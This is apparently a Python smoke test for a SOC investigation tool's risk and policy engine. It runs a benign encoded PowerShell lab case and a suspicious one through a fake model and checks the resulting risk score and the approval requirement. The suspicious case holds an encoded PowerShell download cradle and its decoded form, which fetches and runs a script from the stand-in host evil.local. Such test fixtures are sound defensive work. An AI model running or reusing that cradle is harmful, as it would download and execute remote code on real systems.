"""Standalone offline smoke test for Milestone 3D deterministic risk and policy engine.

Security Rules:
  - Uses FakeModel ONLY (zero live model calls, zero secrets).
  - Uses local ToolRouter with deterministic tools (zero network calls).
  - Evaluates two deterministic scenarios:
      Scenario A: Controlled benign lab encoded PowerShell
      Scenario B: Suspicious encoded PowerShell synthetic case
  - Prints ONLY:
      - Incident ID
      - Risk score
      - Risk level
      - Disposition
      - Proposed action
      - Approval required (yes/no)
  - Never prints decoded command, raw telemetry, prompts, or secrets.
"""

import sys
from pathlib import Path

# Ensure repository root is on sys.path
_REPO_ROOT = Path(__file__).resolve().parent.parent
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

from investigator.audit import AuditLog
from investigator.fake_model import FakeModel
from investigator.model import DecisionType, ModelDecision, ToolRequest
from investigator.orchestrator import InvestigationOrchestrator
from investigator.policy import (
    BENIGN_LAB_DETECTION_ID,
    EXACT_BENIGN_COMMAND,
    PolicyContext,
    RiskPolicyEngine,
)
from investigator.schemas import ConfidenceLevel, InvestigationInput, InvestigationResult
from investigator.tool_router import ToolRouter


def run_scenario_a() -> bool:
    """Scenario A: Controlled benign lab encoded PowerShell test."""
    alert = InvestigationInput(
        incident_id="INC-SMOKE-3D-A",
        timestamp="2026-09-17T08:30:00Z",
        host="DC01",
        user="SOCLAB\\Administrator",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAQQBJAC0ATgBhAHQAaQB2AGUAUwBPAEMALQBMAEEAQgAtAFQARQBTAFQAJwA=",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        parent_command_line="cmd.exe",
        detection_name="Suspicious Encoded PowerShell Execution",
        detection_id="DET-POWERSHELL-001",
    )

    fake_model = FakeModel(
        decisions=[
            ModelDecision(
                decision_type=DecisionType.TOOL_REQUEST,
                tool_request=ToolRequest(
                    tool_name="decode_base64_powershell",
                    arguments={"encoded_input": "VwByAGkAdABlAC0ASABvAHMAdAAgACcAQQBJAC0ATgBhAHQAaQB2AGUAUwBPAEMALQBMAEEAQgAtAFQARQBTAFQAJwA="},
                ),
            ),
            ModelDecision(
                decision_type=DecisionType.FINAL_RESULT,
                final_result=InvestigationResult(
                    summary="Verified benign controlled test execution on DC01.",
                    observations=("Decoded Write-Host lab test marker",),
                    decoded_command=EXACT_BENIGN_COMMAND,
                    mitre_techniques=("T1059.001",),
                    suspicious_indicators=(),
                    recommended_next_step="Close incident as controlled test.",
                    confidence_level=ConfidenceLevel.LOW.value,
                    evidence_refs=("DC01:Sysmon:EventID1",),
                ),
            ),
        ]
    )

    router = ToolRouter()
    orchestrator = InvestigationOrchestrator(model=fake_model, tool_router=router)
    inv_result = orchestrator.investigate(alert)

    # Deterministic decode execution
    decode_res = router.execute_tool(
        "decode_base64_powershell",
        {"encoded_input": "VwByAGkAdABlAC0ASABvAHMAdAAgACcAQQBJAC0ATgBhAHQAaQB2AGUAUwBPAEMALQBMAEEAQgAtAFQARQBTAFQAJwA="},
    )

    context = PolicyContext(
        alert=alert,
        verified_detection_id=BENIGN_LAB_DETECTION_ID,
        deterministic_decoded_command=decode_res.decoded_text,
        mitre_technique_id="T1059.001",
        tool_failure_or_incomplete_evidence=False,
    )

    engine = RiskPolicyEngine()
    decision = engine.evaluate(context, inv_result)

    print("--- Scenario A (Controlled Benign Lab) ---")
    print(f"Incident ID: {context.alert.incident_id}")
    print(f"Risk score: {decision.risk_score}")
    print(f"Risk level: {decision.risk_level.value}")
    print(f"Disposition: {decision.action_disposition.value}")
    print(f"Proposed action: {decision.proposed_action.value}")
    print(f"Approval required: {'yes' if decision.requires_human_approval else 'no'}")
    return decision.risk_score == 0 and not decision.requires_human_approval


def run_scenario_b() -> bool:
    """Scenario B: Suspicious encoded PowerShell synthetic case."""
    alert = InvestigationInput(
        incident_id="INC-SMOKE-3D-B",
        timestamp="2026-09-17T08:35:00Z",
        host="DC01",
        user="SOCLAB\\Administrator",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -NoProfile -EncodedCommand aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AbABvAGMAYQBsAC8AcwAuAHAAcwAxACcAKQA=",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        parent_command_line="cmd.exe",
        detection_name="Suspicious Encoded PowerShell Execution",
        detection_id="DET-POWERSHELL-001",
    )

    fake_model = FakeModel(
        decisions=[
            ModelDecision(
                decision_type=DecisionType.FINAL_RESULT,
                final_result=InvestigationResult(
                    summary="High confidence malicious download cradle detected.",
                    observations=("Remote script download via WebClient",),
                    decoded_command="iex (new-object system.net.webclient).downloadstring('http://evil.local/s.ps1')",
                    mitre_techniques=("T1059.001",),
                    suspicious_indicators=("remote_download", "obfuscated_cradle"),
                    recommended_next_step="Isolate endpoint DC01.",
                    confidence_level=ConfidenceLevel.HIGH.value,
                    evidence_refs=("DC01:Sysmon:EventID1",),
                ),
            ),
        ]
    )

    router = ToolRouter()
    orchestrator = InvestigationOrchestrator(model=fake_model, tool_router=router)
    inv_result = orchestrator.investigate(alert)

    context = PolicyContext(
        alert=alert,
        verified_detection_id=BENIGN_LAB_DETECTION_ID,  # 25 (encoded powershell)
        deterministic_decoded_command="iex (new-object system.net.webclient)...",  # 10
        mitre_technique_id="T1059.001",  # 10
        tool_failure_or_incomplete_evidence=False,
    )
    # Context (45) + Suspicious indicators (25) + High confidence (10) = 80 (CRITICAL)

    engine = RiskPolicyEngine()
    decision = engine.evaluate(context, inv_result)

    print("\n--- Scenario B (Suspicious Encoded Execution) ---")
    print(f"Incident ID: {context.alert.incident_id}")
    print(f"Risk score: {decision.risk_score}")
    print(f"Risk level: {decision.risk_level.value}")
    print(f"Disposition: {decision.action_disposition.value}")
    print(f"Proposed action: {decision.proposed_action.value}")
    print(f"Approval required: {'yes' if decision.requires_human_approval else 'no'}")
    return decision.risk_score >= 75 and decision.requires_human_approval


def main() -> int:
    try:
        ok_a = run_scenario_a()
        ok_b = run_scenario_b()
        if ok_a and ok_b:
            print("\nSmoke Test Status: SUCCESS")
            return 0
        else:
            print("\nSmoke Test Status: FAILURE", file=sys.stderr)
            return 1
    except Exception as exc:
        print(f"\nSmoke Test Error: {type(exc).__name__}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
